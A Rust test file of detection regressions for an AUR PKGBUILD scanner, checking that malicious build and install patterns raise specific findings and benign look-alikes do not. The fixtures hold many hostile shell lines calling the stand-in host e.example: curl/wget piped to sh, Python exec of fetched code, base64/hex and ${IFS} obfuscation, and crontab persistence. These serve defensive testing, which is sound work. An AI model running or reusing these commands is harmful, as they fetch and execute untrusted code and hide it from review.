//! Detection hardening regressions (audit 2026-10).
//!
//! Every case is checked in BOTH directions: the malicious form must produce the
//! specific finding code, and the closest benign look-alike must not. They run
//! the whole scanner (all analyzers) on a real PKGBUILD / install scriptlet on
//! disk, so they pin behavior across the rule engine, the variable resolver and
//! the structural analyzers together.

// Aliased: these are offline fixture scans with no registry lookup by design
// (the registry-None guard in cli_behavior.rs is about install-gate call sites).
use aur_scanner_core::{Registry as Reg, Scanner, Severity};

const HEAD: &str = "pkgname=t\npkgver=1\npkgrel=1\narch=(any)\n";

/// Scan `PKGBUILD` (header + `body`) and an optional `t.install`; return
/// `(id, severity)` for every finding.
async fn scan(body: &str, install: Option<&str>) -> Vec<(String, Severity)> {
    let dir = tempfile::tempdir().expect("tempdir");
    let mut pkgbuild = format!("{HEAD}{body}\n");
    if install.is_some() {
        pkgbuild.push_str("install=t.install\n");
    }
    std::fs::write(dir.path().join("PKGBUILD"), pkgbuild).unwrap();
    if let Some(i) = install {
        std::fs::write(dir.path().join("t.install"), i).unwrap();
    }
    let scanner = Scanner::with_defaults().expect("scanner");
    let res = scanner
        .scan_pkgbuild(&dir.path().join("PKGBUILD"), Reg::None)
        .await
        .expect("scan");
    res.findings
        .into_iter()
        .map(|f| (f.id, f.severity))
        .collect()
}

fn has(f: &[(String, Severity)], id: &str) -> bool {
    f.iter().any(|(i, _)| i == id)
}

fn sev(f: &[(String, Severity)], id: &str) -> Option<Severity> {
    f.iter().filter(|(i, _)| i == id).map(|(_, s)| *s).max()
}

// --- 1/2/3/12: variable resolution ----------------------------------------

#[tokio::test]
async fn two_assignments_on_one_line_resolve() {
    let f = scan(
        "package() {\n  c=curl; s=sh\n  $c -s http://e.example/x | $s\n}",
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
    assert!(has(&f, "EXEC-REMOTE"), "{f:?}");
    assert!(has(&f, "FUNC-001"), "{f:?}");
}

#[tokio::test]
async fn top_level_variable_reaches_function_bodies() {
    let f = scan(
        "_c=curl\npackage() {\n  $_c -s http://e.example/x | sh\n}",
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
    assert!(has(&f, "EXEC-REMOTE"), "{f:?}");
}

#[tokio::test]
async fn top_level_variable_assigned_after_the_function_still_applies() {
    // makepkg sources the whole file before running any function.
    let f = scan(
        "package() {\n  $_c -s http://e.example/x | sh\n}\n_c=curl",
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
}

#[tokio::test]
async fn function_local_variable_does_not_leak_into_another_function() {
    let f = scan(
        "build() {\n  c=curl\n  true\n}\npackage() {\n  $c -s http://e.example/x | sh\n}",
        None,
    )
    .await;
    assert!(!has(&f, "DLE-001"), "local var must not leak: {f:?}");
    assert!(!has(&f, "EXEC-REMOTE"), "local var must not leak: {f:?}");
}

#[tokio::test]
async fn multiple_assignments_in_one_local_resolve() {
    let f = scan(
        "package() {\n  local c=curl s=sh\n  $c -s http://e.example/x | $s\n}",
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
    assert!(has(&f, "EXEC-REMOTE"), "{f:?}");
}

#[tokio::test]
async fn variable_on_its_own_line_feeds_exec_remote_and_func001() {
    let f = scan(
        "package() {\n  c=curl\n  $c -s http://e.example/x | sh\n}",
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
    assert!(has(&f, "EXEC-REMOTE"), "{f:?}");
    assert!(has(&f, "FUNC-001"), "{f:?}");
}

#[tokio::test]
async fn unrelated_variables_do_not_raise_fetch_exec() {
    let f = scan(
        "package() {\n  c=cat; s=tee\n  $c file | $s out\n  make DESTDIR=\"$pkgdir\" install\n}",
        None,
    )
    .await;
    assert!(!has(&f, "DLE-001"), "{f:?}");
    assert!(!has(&f, "EXEC-REMOTE"), "{f:?}");
    assert!(!has(&f, "FUNC-001"), "{f:?}");
}

// --- 4: any filter chain between fetch and shell ---------------------------

#[tokio::test]
async fn fetch_through_filter_chain_into_shell() {
    for line in [
        "curl -s http://e.example/x | rev | sh",
        "curl -s http://e.example/x | tr a-z n-za-m | bash",
        "wget -qO- http://e.example/x | sed s/a/b/ | rev | sh",
    ] {
        let f = scan(&format!("package() {{\n  {line}\n}}"), None).await;
        assert!(has(&f, "EXEC-REMOTE"), "{line}: {f:?}");
        assert!(has(&f, "DLE-001") || has(&f, "DLE-002"), "{line}: {f:?}");
    }
}

#[tokio::test]
async fn fetch_into_non_shell_filter_chain_is_not_exec() {
    let f = scan(
        "package() {\n  curl -s http://e.example/x | rev | tee out\n  curl -s http://e.example/y || sh -c 'echo failed'\n}",
        None,
    )
    .await;
    assert!(!has(&f, "DLE-001"), "{f:?}");
    assert!(!has(&f, "EXEC-REMOTE"), "{f:?}");
}

// --- 5: interpreter inline fetch-and-exec -----------------------------------

#[tokio::test]
async fn python_inline_fetch_and_exec() {
    for line in [
        r#"python3 -c "import urllib.request;exec(urllib.request.urlopen('http://e.example/x').read())""#,
        r#"python -c "from urllib.request import urlopen; exec(urlopen('http://e.example/x').read())""#,
    ] {
        let f = scan(&format!("package() {{\n  {line}\n}}"), None).await;
        assert!(has(&f, "EXEC-REMOTE"), "{line}: {f:?}");
    }
}

#[tokio::test]
async fn python_inline_without_fetch_or_exec_is_clean() {
    let f = scan(
        "package() {\n  python3 -c \"import sys; print(sys.version)\"\n  python -c \"import urllib.parse; print(urllib.parse.quote('a b'))\"\n}",
        None,
    )
    .await;
    assert!(!has(&f, "EXEC-REMOTE"), "{f:?}");
}

// --- 6: clone then run ------------------------------------------------------

#[tokio::test]
async fn clone_then_run_external_script() {
    for body in [
        "package() {\n  git clone http://e.example/r.git r && ./r/install.sh\n}",
        "package() {\n  git clone http://e.example/r.git r\n  sh r/install.sh\n}",
        "package() {\n  git clone http://e.example/r.git\n  cd r\n  ./install.sh\n}",
        "run() { \"$@\"; }\npackage() {\n  git clone http://e.example/r.git r\n  run ./r/install.sh\n}",
    ] {
        let f = scan(body, None).await;
        assert!(has(&f, "EXEC-REMOTE"), "{body}: {f:?}");
    }
}

#[tokio::test]
async fn clone_then_build_or_copy_is_not_flagged_as_exec() {
    let f = scan(
        "package() {\n  git clone http://e.example/r.git r\n  cd r\n  make\n  install -Dm755 r/bin/tool \"$pkgdir/usr/bin/tool\"\n  cp -r r/docs \"$pkgdir/usr/share/doc\"\n}",
        None,
    )
    .await;
    assert!(!has(&f, "EXEC-REMOTE"), "{f:?}");
}

// --- 7: download to a file, then execute it ---------------------------------

#[tokio::test]
async fn download_then_execute_file() {
    for body in [
        "package() {\n  curl -o f http://e.example/x\n  sh f\n}",
        "package() {\n  curl -o ~/.x http://e.example/x; bash ~/.x\n}",
        "package() {\n  f=/tmp/f\n  curl -o $f http://e.example/x\n  bash $f\n}",
        "package() {\n  wget -O f http://e.example/x\n  chmod +x f\n  ./f\n}",
        "package() {\n  curl -fsSLo f http://e.example/x && . ./f\n}",
        "package() {\n  curl -O http://e.example/x.sh\n  bash x.sh\n}",
    ] {
        let f = scan(body, None).await;
        assert!(has(&f, "EXEC-REMOTE"), "{body}: {f:?}");
    }
}

#[tokio::test]
async fn same_line_download_then_execute_trips_dle003() {
    let f = scan(
        "package() {\n  curl -o ~/.x http://e.example/x; bash ~/.x\n}",
        None,
    )
    .await;
    assert!(has(&f, "DLE-003"), "{f:?}");
}

#[tokio::test]
async fn download_then_unrelated_use_is_not_exec() {
    let f = scan(
        "package() {\n  curl -o data.tar.gz http://e.example/x.tar.gz\n  tar xf data.tar.gz\n  chmod +x helper.sh\n  sh helper.sh\n  wget -o wget.log -O out.bin http://e.example/y\n  cat out.bin > /dev/null\n}",
        None,
    )
    .await;
    assert!(!has(&f, "EXEC-REMOTE"), "{f:?}");
    assert!(!has(&f, "DLE-003"), "{f:?}");
}

// --- 8: helper function defined at top level, called later ------------------

#[tokio::test]
async fn helper_function_body_is_scanned_and_attributed_to_the_caller() {
    let f = scan(
        "f() { curl -s http://e.example/x | sh; }\npackage() {\n  f\n}",
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
    assert!(has(&f, "EXEC-REMOTE"), "{f:?}");
    assert!(
        has(&f, "FUNC-001"),
        "caller package() must see the helper: {f:?}"
    );
}

#[tokio::test]
async fn uncalled_unrelated_helper_does_not_taint_package() {
    let f = scan(
        "helper() { echo hi; }\ndl() { curl -s http://e.example/x -o /tmp/y; }\npackage() {\n  helper\n}",
        None,
    )
    .await;
    assert!(
        !f.iter().any(|(i, _)| i == "FUNC-001"),
        "package() never calls dl(): {f:?}"
    );
}

// --- 9: array exec ----------------------------------------------------------

#[tokio::test]
async fn array_command_is_resolved() {
    let f = scan(
        "package() {\n  cmd=(curl -s http://e.example/x); \"${cmd[@]}\" | sh\n}",
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
    assert!(has(&f, "EXEC-REMOTE"), "{f:?}");
}

// --- 10: heredoc fed to a shell expands a fetch -----------------------------

#[tokio::test]
async fn shell_heredoc_with_fetch_substitution() {
    let f = scan(
        "package() {\n  bash <<EOF\n$(curl -s http://e.example/x)\nEOF\n}",
        None,
    )
    .await;
    assert!(has(&f, "EXEC-REMOTE"), "{f:?}");
}

#[tokio::test]
async fn printed_heredoc_with_fetch_text_is_not_exec() {
    let f = scan(
        "package() {\n  cat <<EOF > \"$pkgdir/usr/share/doc/t/README\"\nRun: $(curl -s http://e.example/x) to see\nEOF\n  bash <<< word\n  make\n}",
        None,
    )
    .await;
    assert!(!has(&f, "EXEC-REMOTE"), "{f:?}");
}

// --- 11: ${IFS} separators --------------------------------------------------

#[tokio::test]
async fn ifs_separator_does_not_hide_dle001() {
    for line in [
        "curl${IFS}-s${IFS}http://e.example/x|sh",
        "curl$IFS-s$IFS'http://e.example/x'|bash",
        "wget${IFS}-qO-${IFS}http://e.example/x|sh",
    ] {
        let f = scan(&format!("package() {{\n  {line}\n}}"), None).await;
        assert!(has(&f, "DLE-001") || has(&f, "DLE-002"), "{line}: {f:?}");
        assert!(has(&f, "EXEC-REMOTE"), "{line}: {f:?}");
    }
}

// --- 13: crontab from stdin -------------------------------------------------

#[tokio::test]
async fn crontab_from_stdin_is_persistence() {
    for line in [
        "crontab -u root - < /tmp/f",
        "crontab - < /tmp/f",
        "echo '* * * * * x' | crontab -",
        "crontab -u root /tmp/f",
    ] {
        let f = scan(
            "package() {\n  true\n}",
            Some(&format!("post_install() {{\n  {line}\n}}")),
        )
        .await;
        assert!(has(&f, "PERSIST-003"), "{line}: {f:?}");
    }
}

#[tokio::test]
async fn crontab_listing_or_removal_is_not_persistence() {
    for line in [
        "crontab -l",
        "crontab -u root -l",
        "crontab -r",
        "crontab -u root -r",
    ] {
        let f = scan(
            "package() {\n  true\n}",
            Some(&format!("post_install() {{\n  {line}\n}}")),
        )
        .await;
        assert!(!has(&f, "PERSIST-003"), "{line}: {f:?}");
    }
}

// --- 14: inline base64 / hex payloads ---------------------------------------

#[tokio::test]
async fn base64_payload_decoded_trips_the_specific_rule() {
    // "curl http://e.example/x | sh"
    let b64 = "Y3VybCBodHRwOi8vZS5leGFtcGxlL3ggfCBzaA==";
    let f = scan(
        &format!("package() {{\n  echo {b64} | base64 -d | sh\n}}"),
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
    assert!(has(&f, "EXEC-REMOTE"), "{f:?}");
    // the generic finding is kept
    assert!(has(&f, "DEEP-001"), "{f:?}");
}

#[tokio::test]
async fn hex_payload_decoded_trips_the_specific_rule() {
    // "curl http://e.example/x | sh" as hex
    let hex = "6375726c20687474703a2f2f652e6578616d706c652f78207c207368";
    let f = scan(
        &format!("package() {{\n  echo {hex} | xxd -r -p | sh\n}}"),
        None,
    )
    .await;
    assert!(has(&f, "DLE-001"), "{f:?}");
}

#[tokio::test]
async fn benign_base64_text_or_binary_does_not_fire_fetch_exec() {
    // "hello world, this is fine" and a binary blob written to a file
    let f = scan(
        "package() {\n  echo aGVsbG8gd29ybGQsIHRoaXMgaXMgZmluZQ== | base64 -d > \"$pkgdir/usr/share/t/msg\"\n  echo iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ | base64 -d > \"$pkgdir/usr/share/t/i.png\"\n}",
        None,
    )
    .await;
    assert!(!has(&f, "DLE-001"), "{f:?}");
    assert!(!has(&f, "EXEC-REMOTE"), "{f:?}");
}

// --- 15: PRIV-002 chrome-sandbox -------------------------------------------

#[tokio::test]
async fn chrome_sandbox_suid_is_downgraded() {
    for body in [
        "package() {\n  chmod 4755 \"$pkgdir/opt/app/chrome-sandbox\"\n}",
        "package() {\n  chmod 4755 \"${pkgdir}/opt/app/chrome-sandbox\"\n}",
        "package() {\n  install -Dm4755 chrome-sandbox \"$pkgdir/opt/app/chrome-sandbox\"\n}",
    ] {
        let f = scan(body, None).await;
        assert_eq!(sev(&f, "PRIV-002"), Some(Severity::Low), "{body}: {f:?}");
    }
}

#[tokio::test]
async fn other_suid_stays_critical() {
    for body in [
        "package() {\n  chmod 4755 \"$pkgdir/usr/bin/evil\"\n}",
        "package() {\n  chmod 4755 \"$pkgdir/opt/app/chrome-sandbox\" \"$pkgdir/usr/bin/evil\"\n}",
        "package() {\n  chmod 4755 \"$pkgdir/opt/app/chrome-sandbox\"; chmod u+s \"$pkgdir/usr/bin/x\"\n}",
        "package() {\n  chmod 4755 /opt/app/chrome-sandbox\n}",
        "package() {\n  chmod 4755 \"$pkgdir/opt/app/my-chrome-sandbox\"\n}",
    ] {
        let f = scan(body, None).await;
        assert_eq!(sev(&f, "PRIV-002"), Some(Severity::Critical), "{body}: {f:?}");
    }
}

// --- 16: PERSIST-001 daemon-reload ------------------------------------------

#[tokio::test]
async fn daemon_reload_is_not_service_creation() {
    for hook in ["post_upgrade", "post_install"] {
        let f = scan(
            "package() {\n  true\n}",
            Some(&format!("{hook}() {{\n  systemctl daemon-reload\n}}")),
        )
        .await;
        assert!(!has(&f, "PERSIST-001"), "{hook}: {f:?}");
    }
}

#[tokio::test]
async fn enabling_or_starting_a_unit_still_fires() {
    for line in [
        "systemctl enable foo.service",
        "systemctl start foo.service",
        "systemctl --now enable foo.service",
        "systemctl enable --now foo.service",
        "systemctl --user enable foo.service",
    ] {
        let f = scan(
            "package() {\n  true\n}",
            Some(&format!("post_install() {{\n  {line}\n}}")),
        )
        .await;
        assert!(has(&f, "PERSIST-001"), "{line}: {f:?}");
    }
}

// --- 17: PRIV-005 modprobe.d --------------------------------------------------

#[tokio::test]
async fn shipping_a_modprobe_config_is_not_a_module_operation() {
    let f = scan(
        "package() {\n  install -Dm644 t.conf \"$pkgdir/usr/lib/modprobe.d/t.conf\"\n  echo 'options t x=1' > \"$pkgdir/etc/modprobe.d/t.conf\"\n}",
        None,
    )
    .await;
    assert!(!has(&f, "PRIV-005"), "{f:?}");
}

#[tokio::test]
async fn module_commands_still_fire() {
    for line in [
        "modprobe foo",
        "/sbin/insmod foo.ko",
        "sudo rmmod foo",
        "x && modprobe -r foo",
    ] {
        let f = scan(&format!("package() {{\n  {line}\n}}"), None).await;
        assert!(has(&f, "PRIV-005"), "{line}: {f:?}");
    }
}

// --- 18: HIDDEN-001 only on writes -----------------------------------------

#[tokio::test]
async fn referencing_or_reading_a_config_dir_is_not_hidden_file_creation() {
    let f = scan(
        "package() {\n  cfg=\"${XDG_CONFIG_HOME:-~/.config}/foo-flags.conf\"\n  cfg2=\"${XDG_CONFIG_HOME:-$HOME/.config}/foo\"\n  [[ -f ~/.config/foo ]] && cat ~/.config/foo\n}",
        None,
    )
    .await;
    assert!(!has(&f, "HIDDEN-001"), "{f:?}");
}

#[tokio::test]
async fn writing_a_home_dotfile_still_fires() {
    for line in [
        "echo x >> ~/.bashrc",
        "echo x > $HOME/.hidden",
        "touch $HOME/.hidden",
        "mkdir -p ~/.cache/x",
        "cp a ~/.config/evil",
        "curl -o ~/.x http://e.example/x",
        "tee -a ~/.profile",
        "install -Dm755 a ~/.local/bin/a",
    ] {
        let f = scan(
            "package() {\n  true\n}",
            Some(&format!("post_install() {{\n  {line}\n}}")),
        )
        .await;
        assert!(has(&f, "HIDDEN-001"), "{line}: {f:?}");
    }
}
